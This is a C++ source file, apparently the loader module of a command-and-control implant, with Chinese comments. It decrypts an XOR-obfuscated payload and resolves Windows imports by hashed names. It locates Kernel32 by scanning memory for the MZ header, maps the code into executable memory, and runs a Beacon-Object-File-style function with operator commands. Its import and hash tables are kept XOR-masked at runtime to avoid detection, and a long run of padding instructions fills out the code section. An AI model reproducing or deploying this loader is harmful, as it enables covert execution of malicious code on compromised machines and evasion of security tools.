#include "Loader.h"

int dllNum = 0;
int* dllHashList = NULL;
PDWORD_PTR dllBaseList = NULL;

int impFuncNum = 0;
LONGLONG* impFuncHashList = NULL;
PDWORD_PTR impFuncAddrList = NULL;

__declspec(noinline) int GetHash(char* str, int len);
__declspec(noinline) void XorData(PBYTE data, int dataLen, BYTE xor1, BYTE xor2);

// 保证 RunPayload 在 .func 置顶
#pragma code_seg(".func")

int RunPayload(PBYTE pPayload, int payloadSize, int bofFuncHash, char* commandPara, int commandParaLen, char*& outputData, int& outputDataLen, PVOID specialParaList[]) {
    if (pPayload == NULL || payloadSize < 11) {
        return 0;
    }
    BYTE xor1 = pPayload[payloadSize - 1];
    BYTE xor2 = pPayload[payloadSize - 2];
    XorData(pPayload, 9, xor1, xor2);
    WORD rdataLen = *(PWORD)pPayload;
    WORD obfCodeLen = *(PWORD)(pPayload + 2);
    WORD importInfoListLen = *(PWORD)(pPayload + 4);
    WORD bofFuncOffsetMapLen = *(PWORD)(pPayload + 6);
    BYTE needReloc = *(PBYTE)(pPayload + 8);
    *(PBYTE)(pPayload + 8) = 0x00;
    XorData(pPayload, 9, xor1, xor2);
    if (payloadSize != rdataLen + obfCodeLen + importInfoListLen + bofFuncOffsetMapLen + 11) {
        return 0;
    }
    PBYTE pImportInfoList = pPayload + 9;
    PBYTE pBofFuncOffsetMap = pImportInfoList + importInfoListLen;
    PBYTE pRdata = pBofFuncOffsetMap + bofFuncOffsetMapLen;
    PBYTE pObfCode = pRdata + rdataLen;

    // 查找 bofFunc 偏移
    int ifFind = 0;
    WORD bofFuncOffset;
    XorData(pBofFuncOffsetMap, bofFuncOffsetMapLen, xor1, xor2);
    for (int i = 0; i < bofFuncOffsetMapLen; i += 6) {
        if (*(int*)(pBofFuncOffsetMap + i) == bofFuncHash) {
            ifFind = 1;
            bofFuncOffset = *(PWORD)(pBofFuncOffsetMap + i + sizeof(int));
            break;
        }
    }
    XorData(pBofFuncOffsetMap, bofFuncOffsetMapLen, xor1, xor2);
    if (!ifFind) {
        return 0;
    }

    // 重定位
    if (needReloc == 0x01) {
        if (dllHashList == NULL) {
            dllHashList = (int*)malloc(1000 * sizeof(int));
        }
        if (dllBaseList == NULL) {
            dllBaseList = (PDWORD_PTR)malloc(1000 * sizeof(DWORD_PTR));
        }
        if (impFuncHashList == NULL) {
            impFuncHashList = (LONGLONG*)malloc(1000 * sizeof(LONGLONG));
        }
        if (impFuncAddrList == NULL) {
            impFuncAddrList = (PDWORD_PTR)malloc(1000 * sizeof(DWORD_PTR));
        }
        if (dllHashList == NULL || dllBaseList == NULL || impFuncHashList == NULL || impFuncAddrList == NULL) {
            return 0;
        }
        memset(dllBaseList, 0, 1000 * sizeof(DWORD_PTR));
        memset(impFuncAddrList, 0, 1000 * sizeof(DWORD_PTR));
        PVOID pObfCodeX = VirtualAlloc(0, obfCodeLen, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
        if (pObfCodeX == NULL) {
            return 0;
        }
        XorData(pObfCode, obfCodeLen, xor1, xor2);
        int dllNameLen;
        for (int i = 0; i < importInfoListLen; i += dllNameLen + sizeof(WORD) + sizeof(int) + 1) {
            if (dllNum >= 1000 || impFuncNum >= 1000) {
                return 0;
            }
            XorData(pImportInfoList, importInfoListLen, xor1, xor2);
            WORD relocOffset = *(PWORD)(pImportInfoList + i);
            char* pDllName = (char*)pImportInfoList + sizeof(WORD) + i;
            char dllName[50];
            dllNameLen = strlen(pDllName);
            if (strcpy_s(dllName, sizeof(dllName), pDllName)) {
                XorData(pImportInfoList, importInfoListLen, xor1, xor2);
                return 0;
            }
            int impFuncHash = *(int*)(pDllName + dllNameLen + 1);
            XorData(pImportInfoList, importInfoListLen, xor1, xor2);
            int dllHash = GetHash(dllName, dllNameLen);
            // .rdata
            if (dllHash == -1394134574) {
                if (impFuncHash != 0) {
                    return 0;
                }
                *(PDWORD)(pObfCode + relocOffset) += (DWORD)(pRdata - ((PBYTE)pObfCodeX + relocOffset + 4));
            }
            // DLL
            else {
                // 获取 DLL 基址
                DWORD_PTR dllBase = 0;
                for (int i = 0; i < dllNum; i++) {
                    XorData((PBYTE)&dllHashList[i], sizeof(int), xor1, xor2);
                    if (dllHashList[i] == dllHash) {
                        XorData((PBYTE)&dllHashList[i], sizeof(int), xor1, xor2);
                        dllBase = dllBaseList[i];
                        break;
                    }
                    XorData((PBYTE)&dllHashList[i], sizeof(int), xor1, xor2);
                }
                if (!dllBase) {
                    if (dllHash == -1499897628) { // Kernel32
                        PBYTE pVirtualAlloc = (PBYTE)VirtualAlloc;
                        for (; *(PDWORD)pVirtualAlloc != 0x00905A4D; pVirtualAlloc--); // 查找 MZ
                        dllBase = (DWORD_PTR)pVirtualAlloc;
                    }
                    else {
                        HMODULE hDll = LoadLibraryA(dllName);
                        if (hDll == NULL) {
                            return 0;
                        }
                        dllBase = (DWORD_PTR)hDll;
                    }
                    dllHashList[dllNum] = dllHash;
                    XorData((PBYTE)&dllHashList[dllNum], sizeof(int), xor1, xor2);
                    dllBaseList[dllNum] = dllBase;
                    dllNum++;
                }
                // 获取导入函数指针
                PDWORD_PTR pImpFunc = NULL;
                for (int i = 0; i < impFuncNum; i++) {
                    XorData((PBYTE)&impFuncHashList[i], sizeof(LONGLONG), xor1, xor2);
                    if (*(int*)&impFuncHashList[i] == dllHash && *(int*)((PBYTE)&impFuncHashList[i] + sizeof(int)) == impFuncHash) {
                        XorData((PBYTE)&impFuncHashList[i], sizeof(LONGLONG), xor1, xor2);
                        pImpFunc = &impFuncAddrList[i];
                        break;
                    }
                    XorData((PBYTE)&impFuncHashList[i], sizeof(LONGLONG), xor1, xor2);
                }
                if (pImpFunc == NULL) {
                    PIMAGE_DOS_HEADER pDos = (PIMAGE_DOS_HEADER)dllBase;
                    PIMAGE_NT_HEADERS pNt = (PIMAGE_NT_HEADERS)(dllBase + pDos->e_lfanew);
                    PIMAGE_EXPORT_DIRECTORY pExportDir = (PIMAGE_EXPORT_DIRECTORY)(dllBase + pNt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress);
                    PDWORD pAddressOfNames = (PDWORD)(dllBase + pExportDir->AddressOfNames);
                    PDWORD pAddressOfFunctions = (PDWORD)(dllBase + pExportDir->AddressOfFunctions);
                    PWORD pAddressOfNameOrdinals = (PWORD)(dllBase + pExportDir->AddressOfNameOrdinals);
                    for (int i = 0; i < pExportDir->NumberOfNames; i++) {
                        char* funcName = (char*)(dllBase + pAddressOfNames[i]);
                        if (GetHash(funcName, strlen(funcName)) == impFuncHash) {
                            *(int*)&impFuncHashList[impFuncNum] = dllHash;
                            *(int*)((PBYTE)&impFuncHashList[impFuncNum] + sizeof(int)) = impFuncHash;
                            XorData((PBYTE)&impFuncHashList[impFuncNum], sizeof(LONGLONG), xor1, xor2);
                            impFuncAddrList[impFuncNum] = dllBase + pAddressOfFunctions[pAddressOfNameOrdinals[i]];
                            pImpFunc = &impFuncAddrList[impFuncNum];
                            impFuncNum++;
                            break;
                        }
                    }
                }
                if (pImpFunc == NULL || !*pImpFunc) {
                    return 0;
                }
                *(PDWORD)(pObfCode + relocOffset) = (DWORD)((DWORD_PTR)pImpFunc - ((DWORD_PTR)pObfCodeX + relocOffset + 4));
            }
        }
        memcpy_s(pObfCodeX, obfCodeLen, pObfCode, obfCodeLen);
        XorData(pObfCode, obfCodeLen, xor1, xor2);
        DWORD oldProtect;
        if (!VirtualProtect(pObfCodeX, obfCodeLen, PAGE_EXECUTE_READ, &oldProtect)) {
            return 0;
        }
        *(PDWORD_PTR)pObfCode = (DWORD_PTR)pObfCodeX;
    }
    XorData(pRdata, rdataLen, xor1, xor2);
    ((void(*)(...))(*(PDWORD_PTR)pObfCode + bofFuncOffset))(commandPara, commandParaLen, &outputData, &outputDataLen, specialParaList);
    XorData(pRdata, rdataLen, xor1, xor2);
    return 1;
}

__declspec(noinline) int GetHash(char* str, int len) {
    int hash = 0;
    for (int i = 0; i < len; i++) {
        hash += str[i];
        hash = (hash << 8) - hash;
    }
    return hash;
}

__declspec(noinline) void XorData(PBYTE data, int dataLen, BYTE xor1, BYTE xor2) {
    for (int i = 0; i < dataLen; i++) {
        data[i] = data[i] ^ xor1 ^ xor2;
    }
}

__attribute__((naked)) void Placeholding() {
    __asm {
        mov rax, 0
        mov rax, 0
        mov rax, 0
        mov rax, 0
        mov rax, 0
        mov rax, 0
        mov rax, 0
        mov rax, 0
        mov rax, 0
        mov rax, 0
        mov rax, 0
        mov rax, 0
        mov rax, 0
        mov rax, 0
        mov rax, 0
        mov rax, 0
        mov rax, 0
        mov rax, 0
        mov rax, 0
        mov rax, 0
        mov rax, 0
        mov rax, 0
        mov rax, 0
        mov rax, 0
        mov rax, 0
        mov rax, 0
        mov rax, 0
        mov rax, 0
        mov rax, 0
        mov rax, 0
        mov rax, 0
        mov rax, 0
        mov rax, 0
        mov rax, 0
        mov rax, 0
        mov rax, 0
        mov rax, 0
        mov rax, 0
        mov rax, 0
        mov rax, 0
        mov rax, 0
        mov rax, 0
        mov rax, 0
        mov rax, 0
        mov rax, 0
        mov rax, 0
        mov rax, 0
        mov rax, 0
        mov rax, 0
        mov rax, 0
        mov rax, 0
        mov rax, 0
        mov rax, 0
        mov rax, 0
        mov rax, 0
        mov rax, 0
        mov rax, 0
        mov rax, 0
        mov rax, 0
        mov rax, 0
        mov rax, 0
        mov rax, 0
        mov rax, 0
        mov rax, 0
        mov rax, 0
        mov rax, 0
        mov rax, 0
        mov rax, 0
        mov rax, 0
        mov rax, 0
        mov rax, 0
        mov rax, 0
        mov rax, 0
        mov rax, 0
        mov rax, 0
        mov rax, 0
        mov rax, 0
        mov rax, 0
        mov rax, 0
        mov rax, 0
        mov rax, 0
        mov rax, 0
        mov rax, 0
        mov rax, 0
        mov rax, 0
        mov rax, 0
        mov rax, 0
        mov rax, 0
        mov rax, 0
        mov rax, 0
        mov rax, 0
        mov rax, 0
        mov rax, 0
        mov rax, 0
        mov rax, 0
        mov rax, 0
        mov rax, 0
        mov rax, 0
        mov rax, 0
        mov rax, 0
        mov rax, 0
        mov rax, 0
        mov rax, 0
        mov rax, 0
        mov rax, 0
        mov rax, 0
        mov rax, 0
        mov rax, 0
        mov rax, 0
        mov rax, 0
        mov rax, 0
        mov rax, 0
        mov rax, 0
        mov rax, 0
        mov rax, 0
        mov rax, 0
        mov rax, 0
        mov rax, 0
        mov rax, 0
        mov rax, 0
        mov rax, 0
        mov rax, 0
        mov rax, 0
        mov rax, 0
        mov rax, 0
        mov rax, 0
        mov rax, 0
        mov rax, 0
        mov rax, 0
        mov rax, 0
        mov rax, 0
        mov rax, 0
        mov rax, 0
        mov rax, 0
        mov rax, 0
        mov rax, 0
        mov rax, 0
        mov rax, 0
        mov rax, 0
        mov rax, 0
        mov rax, 0
        mov rax, 0
        mov rax, 0
        mov rax, 0
        mov rax, 0
        mov rax, 0
        mov rax, 0
        mov rax, 0
        mov rax, 0
        mov rax, 0
        mov rax, 0
        mov rax, 0
        mov rax, 0
        mov rax, 0
        mov rax, 0
        mov rax, 0
        mov rax, 0
        mov rax, 0
        mov rax, 0
        mov rax, 0
        mov rax, 0
        mov rax, 0
        mov rax, 0
        mov rax, 0
        mov rax, 0
        mov rax, 0
        mov rax, 0
        mov rax, 0
        mov rax, 0
        mov rax, 0
        mov rax, 0
        mov rax, 0
        mov rax, 0
        mov rax, 0
        mov rax, 0
        mov rax, 0
        mov rax, 0
        mov rax, 0
        mov rax, 0
        mov rax, 0
        mov rax, 0
        mov rax, 0
        mov rax, 0
        mov rax, 0
        mov rax, 0
        mov rax, 0
        mov rax, 0
        mov rax, 0
        mov rax, 0
        mov rax, 0
        mov rax, 0
        mov rax, 0
        mov rax, 0
        mov rax, 0
        mov rax, 0
        mov rax, 0
        mov rax, 0
        mov rax, 0
        mov rax, 0
        mov rax, 0
        mov rax, 0
        mov rax, 0
        mov rax, 0
        mov rax, 0
        mov rax, 0
        mov rax, 0
        mov rax, 0
        mov rax, 0
        mov rax, 0
        mov rax, 0
        mov rax, 0
        mov rax, 0
        mov rax, 0
        mov rax, 0
        mov rax, 0
        mov rax, 0
        mov rax, 0
        mov rax, 0
        mov rax, 0
        mov rax, 0
        mov rax, 0
        mov rax, 0
        mov rax, 0
        mov rax, 0
        mov rax, 0
        mov rax, 0
        mov rax, 0
        mov rax, 0
        mov rax, 0
        mov rax, 0
        mov rax, 0
        mov rax, 0
        mov rax, 0
        mov rax, 0
        mov rax, 0
        mov rax, 0
        mov rax, 0
        mov rax, 0
        mov rax, 0
        mov rax, 0
        mov rax, 0
        mov rax, 0
        mov rax, 0
        mov rax, 0
        mov rax, 0
        mov rax, 0
        mov rax, 0
        mov rax, 0
        mov rax, 0
        mov rax, 0
        mov rax, 0
        mov rax, 0
        mov rax, 0
        mov rax, 0
        mov rax, 0
        mov rax, 0
        mov rax, 0
        mov rax, 0
        mov rax, 0
        mov rax, 0
        mov rax, 0
        mov rax, 0
        mov rax, 0
        mov rax, 0
        mov rax, 0
        mov rax, 0
        mov rax, 0
        mov rax, 0
        mov rax, 0
        mov rax, 0
        mov rax, 0
        mov rax, 0
        mov rax, 0
        mov rax, 0
        mov rax, 0
        mov rax, 0
        mov rax, 0
        mov rax, 0
        mov rax, 0
        mov rax, 0
        mov rax, 0
        mov rax, 0
        mov rax, 0
        mov rax, 0
        mov rax, 0
        mov rax, 0
        mov rax, 0
        mov rax, 0
        mov rax, 0
        mov rax, 0
        mov rax, 0
        mov rax, 0
        mov rax, 0
        mov rax, 0
        mov rax, 0
        mov rax, 0
        mov rax, 0
        mov rax, 0
        mov rax, 0
        mov rax, 0
        mov rax, 0
        mov rax, 0
        mov rax, 0
        mov rax, 0
        mov rax, 0
        mov rax, 0
        mov rax, 0
        mov rax, 0
        mov rax, 0
        mov rax, 0
        mov rax, 0
        mov rax, 0
        mov rax, 0
        mov rax, 0
        mov rax, 0
        mov rax, 0
        mov rax, 0
        mov rax, 0
        mov rax, 0
        mov rax, 0
        mov rax, 0
        mov rax, 0
        mov rax, 0
        mov rax, 0
        mov rax, 0
        mov rax, 0
        mov rax, 0
        mov rax, 0
        mov rax, 0
        mov rax, 0
        mov rax, 0
        mov rax, 0
        mov rax, 0
        mov rax, 0
        mov rax, 0
        mov rax, 0
        mov rax, 0
        mov rax, 0
        mov rax, 0
        mov rax, 0
        mov rax, 0
        mov rax, 0
        mov rax, 0
        mov rax, 0
        mov rax, 0
        mov rax, 0
        mov rax, 0
        mov rax, 0
        mov rax, 0
        mov rax, 0
        mov rax, 0
        mov rax, 0
        mov rax, 0
        mov rax, 0
        mov rax, 0
        mov rax, 0
        mov rax, 0
        mov rax, 0
        mov rax, 0
        mov rax, 0
        mov rax, 0
        mov rax, 0
        mov rax, 0
        mov rax, 0
        mov rax, 0
        mov rax, 0
        mov rax, 0
        mov rax, 0
        mov rax, 0
        mov rax, 0
        mov rax, 0
        mov rax, 0
        mov rax, 0
        mov rax, 0
        mov rax, 0
        mov rax, 0
        mov rax, 0
        mov rax, 0
        mov rax, 0
        mov rax, 0
        mov rax, 0
        mov rax, 0
        mov rax, 0
        mov rax, 0
        mov rax, 0
        mov rax, 0
        mov rax, 0
        mov rax, 0
        mov rax, 0
        mov rax, 0
        mov rax, 0
        mov rax, 0
        mov rax, 0
        mov rax, 0
        mov rax, 0
        mov rax, 0
        mov rax, 0
        mov rax, 0
        mov rax, 0
        mov rax, 0
        mov rax, 0
        mov rax, 0
        mov rax, 0
        mov rax, 0
        mov rax, 0
        mov rax, 0
        mov rax, 0
        mov rax, 0
        mov rax, 0
        mov rax, 0
        mov rax, 0
        mov rax, 0
        mov rax, 0
        mov rax, 0
        mov rax, 0
        mov rax, 0
        mov rax, 0
        mov rax, 0
        mov rax, 0
        mov rax, 0
        mov rax, 0
        mov rax, 0
        mov rax, 0
        mov rax, 0
        mov rax, 0
        mov rax, 0
        mov rax, 0
        mov rax, 0
        mov rax, 0
        mov rax, 0
        mov rax, 0
        mov rax, 0
        mov rax, 0
        mov rax, 0
        mov rax, 0
        mov rax, 0
        mov rax, 0
        mov rax, 0
        mov rax, 0
        mov rax, 0
        mov rax, 0
        mov rax, 0
        mov rax, 0
        mov rax, 0
        mov rax, 0
        mov rax, 0
        mov rax, 0
        mov rax, 0
        mov rax, 0
        mov rax, 0
        mov rax, 0
        mov rax, 0
        mov rax, 0
        mov rax, 0
        mov rax, 0
        mov rax, 0
        mov rax, 0
        mov rax, 0
        mov rax, 0
        mov rax, 0
        mov rax, 0
        mov rax, 0
        mov rax, 0
        mov rax, 0
        mov rax, 0
        mov rax, 0
        mov rax, 0
        mov rax, 0
        mov rax, 0
        mov rax, 0
        mov rax, 0
        mov rax, 0
        mov rax, 0
        mov rax, 0
        mov rax, 0
        mov rax, 0
        mov rax, 0
        mov rax, 0
        mov rax, 0
        mov rax, 0
        mov rax, 0
        mov rax, 0
        mov rax, 0
        mov rax, 0
        mov rax, 0
        mov rax, 0
        mov rax, 0
        mov rax, 0
        mov rax, 0
        mov rax, 0
        mov rax, 0
        mov rax, 0
        mov rax, 0
        mov rax, 0
        mov rax, 0
        mov rax, 0
        mov rax, 0
        mov rax, 0
        mov rax, 0
        mov rax, 0
        mov rax, 0
        mov rax, 0
        mov rax, 0
        mov rax, 0
        mov rax, 0
        mov rax, 0
        mov rax, 0
        mov rax, 0
        mov rax, 0
        mov rax, 0
        mov rax, 0
        mov rax, 0
        mov rax, 0
        mov rax, 0
        mov rax, 0
        mov rax, 0
        mov rax, 0
        mov rax, 0
        mov rax, 0
        mov rax, 0
        mov rax, 0
        mov rax, 0
        mov rax, 0
        mov rax, 0
        mov rax, 0
        mov rax, 0
        mov rax, 0
        mov rax, 0
        mov rax, 0
        mov rax, 0
        mov rax, 0
        mov rax, 0
        mov rax, 0
        mov rax, 0
        mov rax, 0
        mov rax, 0
        mov rax, 0
        mov rax, 0
        mov rax, 0
        mov rax, 0
        mov rax, 0
        mov rax, 0
        mov rax, 0
        mov rax, 0
        mov rax, 0
        mov rax, 0
        mov rax, 0
        mov rax, 0
        mov rax, 0
        mov rax, 0
        mov rax, 0
        mov rax, 0
        mov rax, 0
        mov rax, 0
        mov rax, 0
        mov rax, 0
        mov rax, 0
        mov rax, 0
        mov rax, 0
        mov rax, 0
        mov rax, 0
        mov rax, 0
        mov rax, 0
        mov rax, 0
        mov rax, 0
        mov rax, 0
        mov rax, 0
        mov rax, 0
        mov rax, 0
        mov rax, 0
        mov rax, 0
        mov rax, 0
        mov rax, 0
        mov rax, 0
        mov rax, 0
        mov rax, 0
        mov rax, 0
        mov rax, 0
        mov rax, 0
        mov rax, 0
        mov rax, 0
        mov rax, 0
        mov rax, 0
        mov rax, 0
        mov rax, 0
        mov rax, 0
        mov rax, 0
        mov rax, 0
        mov rax, 0
        mov rax, 0
        mov rax, 0
        mov rax, 0
        mov rax, 0
        mov rax, 0
        mov rax, 0
        mov rax, 0
        mov rax, 0
        mov rax, 0
        mov rax, 0
        mov rax, 0
        mov rax, 0
        mov rax, 0
        mov rax, 0
        mov rax, 0
        mov rax, 0
        mov rax, 0
        mov rax, 0
        mov rax, 0
        mov rax, 0
        mov rax, 0
        mov rax, 0
        mov rax, 0
        mov rax, 0
        mov rax, 0
        mov rax, 0
        mov rax, 0
        mov rax, 0
        mov rax, 0
        mov rax, 0
        mov rax, 0
        mov rax, 0
        mov rax, 0
        mov rax, 0
        mov rax, 0
        mov rax, 0
        mov rax, 0
        mov rax, 0
        mov rax, 0
        mov rax, 0
        mov rax, 0
        mov rax, 0
        mov rax, 0
        mov rax, 0
        mov rax, 0
        mov rax, 0
        mov rax, 0
        mov rax, 0
        mov rax, 0
        mov rax, 0
        mov rax, 0
        mov rax, 0
        mov rax, 0
        mov rax, 0
        mov rax, 0
        mov rax, 0
        mov rax, 0
        mov rax, 0
        mov rax, 0
        mov rax, 0
        mov rax, 0
        mov rax, 0
        mov rax, 0
        mov rax, 0
        mov rax, 0
        mov rax, 0
        mov rax, 0
        mov rax, 0
        mov rax, 0
        mov rax, 0
        mov rax, 0
        mov rax, 0
        mov rax, 0
        mov rax, 0
        mov rax, 0
        mov rax, 0
        mov rax, 0
        mov rax, 0
        mov rax, 0
        mov rax, 0
        mov rax, 0
        mov rax, 0
        mov rax, 0
        mov rax, 0
        mov rax, 0
        mov rax, 0
        mov rax, 0
        mov rax, 0
        mov rax, 0
        mov rax, 0
        mov rax, 0
        mov rax, 0
        mov rax, 0
        mov rax, 0
        mov rax, 0
        mov rax, 0
        mov rax, 0
        mov rax, 0
        mov rax, 0
        mov rax, 0
        mov rax, 0
        mov rax, 0
        mov rax, 0
        mov rax, 0
        mov rax, 0
        mov rax, 0
        mov rax, 0
        mov rax, 0
        mov rax, 0
        mov rax, 0
        mov rax, 0
        mov rax, 0
        mov rax, 0
        mov rax, 0
        mov rax, 0
        mov rax, 0
        mov rax, 0
        mov rax, 0
        mov rax, 0
        mov rax, 0
        mov rax, 0
        mov rax, 0
        mov rax, 0
        mov rax, 0
        mov rax, 0
        mov rax, 0
        mov rax, 0
        mov rax, 0
        mov rax, 0
        mov rax, 0
        mov rax, 0
        mov rax, 0
        mov rax, 0
        mov rax, 0
        mov rax, 0
        mov rax, 0
        mov rax, 0
        mov rax, 0
        mov rax, 0
        mov rax, 0
        mov rax, 0
        mov rax, 0
        mov rax, 0
        mov rax, 0
        mov rax, 0
        mov rax, 0
        mov rax, 0
        mov rax, 0
        mov rax, 0
        mov rax, 0
        mov rax, 0
        mov rax, 0
        mov rax, 0
        mov rax, 0
        mov rax, 0
        mov rax, 0
        mov rax, 0
        mov rax, 0
        mov rax, 0
        mov rax, 0
        mov rax, 0
        mov rax, 0
        mov rax, 0
        mov rax, 0
        mov rax, 0
        mov rax, 0
        mov rax, 0
        mov rax, 0
        mov rax, 0
        mov rax, 0
        mov rax, 0
        mov rax, 0
        mov rax, 0
        mov rax, 0
        mov rax, 0
        mov rax, 0
        mov rax, 0
        mov rax, 0
        mov rax, 0
        mov rax, 0
        mov rax, 0
        mov rax, 0
        mov rax, 0
        mov rax, 0
        mov rax, 0
        mov rax, 0
        mov rax, 0
        mov rax, 0
        mov rax, 0
        mov rax, 0
        mov rax, 0
        mov rax, 0
        mov rax, 0
        mov rax, 0
        mov rax, 0
        mov rax, 0
        mov rax, 0
        mov rax, 0
        mov rax, 0
        mov rax, 0
        mov rax, 0
        mov rax, 0
        mov rax, 0
        mov rax, 0
        mov rax, 0
        mov rax, 0
        mov rax, 0
        mov rax, 0
        mov rax, 0
        mov rax, 0
        mov rax, 0
        mov rax, 0
        mov rax, 0
        mov rax, 0
        mov rax, 0
        mov rax, 0
        mov rax, 0
        mov rax, 0
        mov rax, 0
        mov rax, 0
        mov rax, 0
        mov rax, 0
        mov rax, 0
        mov rax, 0
        mov rax, 0
        mov rax, 0
        mov rax, 0
        mov rax, 0
        mov rax, 0
        mov rax, 0
        mov rax, 0
        mov rax, 0
        mov rax, 0
        mov rax, 0
        mov rax, 0
        mov rax, 0
        mov rax, 0
        mov rax, 0
        mov rax, 0
        mov rax, 0
        mov rax, 0
        mov rax, 0
        mov rax, 0
        mov rax, 0
        mov rax, 0
        mov rax, 0
        mov rax, 0
        mov rax, 0
        mov rax, 0
        mov rax, 0
        mov rax, 0
        mov rax, 0
        mov rax, 0
        mov rax, 0
        mov rax, 0
        mov rax, 0
        mov rax, 0
        mov rax, 0
        mov rax, 0
        mov rax, 0
        mov rax, 0
        mov rax, 0
        mov rax, 0
        mov rax, 0
        mov rax, 0
        mov rax, 0
        mov rax, 0
        mov rax, 0
        mov rax, 0
        mov rax, 0
        mov rax, 0
        mov rax, 0
        mov rax, 0
        mov rax, 0
        mov rax, 0
        mov rax, 0
        mov rax, 0
        mov rax, 0
        mov rax, 0
        mov rax, 0
        mov rax, 0
        mov rax, 0
        mov rax, 0
        mov rax, 0
        mov rax, 0
        mov rax, 0
        mov rax, 0
        mov rax, 0
        mov rax, 0
        mov rax, 0
        mov rax, 0
        mov rax, 0
        mov rax, 0
        mov rax, 0
        mov rax, 0
        mov rax, 0
        mov rax, 0
        mov rax, 0
        mov rax, 0
        mov rax, 0
        mov rax, 0
        mov rax, 0
        mov rax, 0
        mov rax, 0
        mov rax, 0
        mov rax, 0
        mov rax, 0
        mov rax, 0
        mov rax, 0
        mov rax, 0
        mov rax, 0
        mov rax, 0
        mov rax, 0
        mov rax, 0
        mov rax, 0
        mov rax, 0
        mov rax, 0
        mov rax, 0
        mov rax, 0
        mov rax, 0
        mov rax, 0
        mov rax, 0
        mov rax, 0
        mov rax, 0
        mov rax, 0
        mov rax, 0
        mov rax, 0
        mov rax, 0
        mov rax, 0
        mov rax, 0
        mov rax, 0
        mov rax, 0
        mov rax, 0
        mov rax, 0
        mov rax, 0
        mov rax, 0
        mov rax, 0
        mov rax, 0
        mov rax, 0
        mov rax, 0
        mov rax, 0
        mov rax, 0
        mov rax, 0
        mov rax, 0
        mov rax, 0
        mov rax, 0
        mov rax, 0
        mov rax, 0
        mov rax, 0
        mov rax, 0
        mov rax, 0
        mov rax, 0
        mov rax, 0
        mov rax, 0
        mov rax, 0
        mov rax, 0
        mov rax, 0
        mov rax, 0
        mov rax, 0
        mov rax, 0
        mov rax, 0
        mov rax, 0
        mov rax, 0
        mov rax, 0
        mov rax, 0
        mov rax, 0
        mov rax, 0
        mov rax, 0
        mov rax, 0
        mov rax, 0
        mov rax, 0
        mov rax, 0
        mov rax, 0
        mov rax, 0
        mov rax, 0
        mov rax, 0
        mov rax, 0
        mov rax, 0
        mov rax, 0
        mov rax, 0
        mov rax, 0
        mov rax, 0
        mov rax, 0
        mov rax, 0
        mov rax, 0
        mov rax, 0
        mov rax, 0
        mov rax, 0
        mov rax, 0
        mov rax, 0
        mov rax, 0
        mov rax, 0
        mov rax, 0
        mov rax, 0
        mov rax, 0
        mov rax, 0
        mov rax, 0
        mov rax, 0
        mov rax, 0
        mov rax, 0
        mov rax, 0
        mov rax, 0
        mov rax, 0
        mov rax, 0
        mov rax, 0
        mov rax, 0
        mov rax, 0
        mov rax, 0
        mov rax, 0
        mov rax, 0
        mov rax, 0
        mov rax, 0
        mov rax, 0
        mov rax, 0
        mov rax, 0
        mov rax, 0
        mov rax, 0
        mov rax, 0
        mov rax, 0
        mov rax, 0
        mov rax, 0
        mov rax, 0
        mov rax, 0
        mov rax, 0
        mov rax, 0
        mov rax, 0
        mov rax, 0
        mov rax, 0
        mov rax, 0
        mov rax, 0
        mov rax, 0
        mov rax, 0
        mov rax, 0
        mov rax, 0
        mov rax, 0
        mov rax, 0
        mov rax, 0
        mov rax, 0
        mov rax, 0
        mov rax, 0
        mov rax, 0
        mov rax, 0
        mov rax, 0
        mov rax, 0
        mov rax, 0
        mov rax, 0
        mov rax, 0
        mov rax, 0
        mov rax, 0
        mov rax, 0
        mov rax, 0
    }
}